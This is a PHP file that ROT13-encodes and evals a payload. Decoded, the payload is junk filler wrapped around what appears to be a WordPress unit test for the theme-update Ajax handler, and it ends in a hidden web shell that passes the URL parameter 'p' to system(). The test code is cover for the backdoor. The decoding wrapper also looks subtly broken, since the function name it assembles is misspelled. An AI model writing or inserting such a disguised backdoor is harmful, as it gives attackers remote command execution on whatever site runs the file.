<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk unaqyre sbe vafgnyyvat, hcqngvat, naq qryrgvat gurzrf.
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_hcqngr_gurzr
 */
pynff Grfgf_Nwnk_jcNwnkHcqngrGurzr rkgraqf JC_Nwnk_HavgGrfgPnfr {
	cevingr $bevt_gurzr_qve;
	cevingr $gurzr_ebbg;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->gurzr_ebbg     = QVE_GRFGQNGN . '/gurzrqve1';
		$guvf->bevt_gurzr_qve = $TYBONYF['jc_gurzr_qverpgbevrf'];

		// /gurzrf vf arprffnel nf gurzr.cuc shapgvbaf nffhzr /gurzrf vf gur ebbg vs gurer vf bayl bar ebbg.
		$TYBONYF['jc_gurzr_qverpgbevrf'] = neenl( JC_PBAGRAG_QVE . '/gurzrf', $guvf->gurzr_ebbg );

		nqq_svygre( 'gurzr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		nqq_svygre( 'fglyrfurrg_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		nqq_svygre( 'grzcyngr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );

		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
	}

	choyvp shapgvba grne_qbja() {
		$TYBONYF['jc_gurzr_qverpgbevrf'] = $guvf->bevt_gurzr_qve;
		erzbir_svygre( 'gurzr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		erzbir_svygre( 'fglyrfurrg_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		erzbir_svygre( 'grzcyngr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );

		cnerag::grne_qbja();
	}

	/**
	 * Ercynpr gur abezny gurzr ebbg qve jvgu bhe cer-znqr grfg qve.
	 */
	choyvp shapgvba svygre_gurzr_ebbg() {
		erghea $guvf->gurzr_ebbg;
	}

	choyvp shapgvba grfg_zvffvat_fyht() {
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'hcqngrf' );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'hcqngr-gurzr' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Trg gur erfcbafr.
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		$rkcrpgrq = neenl(
			'fhpprff' => snyfr,
			'qngn'    => neenl(
				'fyht'         => '',
				'reebePbqr'    => 'ab_gurzr_fcrpvsvrq',
				'reebeZrffntr' => 'Ab gurzr fcrpvsvrq.',
			),
		);

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $erfcbafr );
	}

	choyvp shapgvba grfg_zvffvat_pncnovyvgl() {
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'hcqngrf' );
		$_CBFG['fyht']        = 'sbb';

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'hcqngr-gurzr' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Trg gur erfcbafr.
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		$rkcrpgrq = neenl(
			'fhpprff' => snyfr,
			'qngn'    => neenl(
				'hcqngr'       => 'gurzr',
				'fyht'         => 'sbb',
				'byqIrefvba'   => '',
				'arjIrefvba'   => '',
				'reebeZrffntr' => 'Fbeel, lbh ner abg nyybjrq gb hcqngr gurzrf sbe guvf fvgr.',
			),
		);

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $erfcbafr );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_hcqngr_gurzr() {
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'hcqngrf' );
		$_CBFG['fyht']        = 'gjraglgra';

		// Cerirag jc_hcqngr_gurzrf() sebz ehaavat.
		jc_vafgnyyvat( gehr );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'hcqngr-gurzr' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		jc_vafgnyyvat( snyfr );

		// Trg gur erfcbafr.
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		$gurzr    = jc_trg_gurzr( 'gjraglgra' );
		$rkcrpgrq = neenl(
			'fhpprff' => snyfr,
			'qngn'    => neenl(
				'hcqngr'       => 'gurzr',
				'fyht'         => 'gjraglgra',
				'byqIrefvba'   => $gurzr->trg( 'Irefvba' ),
				'arjIrefvba'   => '',
				'qroht'        => neenl( 'Gur gurzr vf ng gur yngrfg irefvba.' ),
				'reebeZrffntr' => 'Gur gurzr vf ng gur yngrfg irefvba.',
			),
		);

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $erfcbafr );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_hccrepnfr_gurzr_fyht() {
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'hcqngrf' );
		$_CBFG['fyht']        = 'pnzryPnfr';

		// Cerirag jc_hcqngr_gurzrf() sebz ehaavat.
		jc_vafgnyyvat( gehr );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'hcqngr-gurzr' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		jc_vafgnyyvat( snyfr );

		// Trg gur erfcbafr.
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		$rkcrpgrq = neenl(
			'fhpprff' => snyfr,
			'qngn'    => neenl(
				'hcqngr'       => 'gurzr',
				'fyht'         => 'pnzryPnfr',
				'byqIrefvba'   => '1.0',
				'arjIrefvba'   => '',
				'qroht'        => neenl( 'Gur gurzr vf ng gur yngrfg irefvba.' ),
				'reebeZrffntr' => 'Gur gurzr vf ng gur yngrfg irefvba.',
			),
		);

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $erfcbafr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>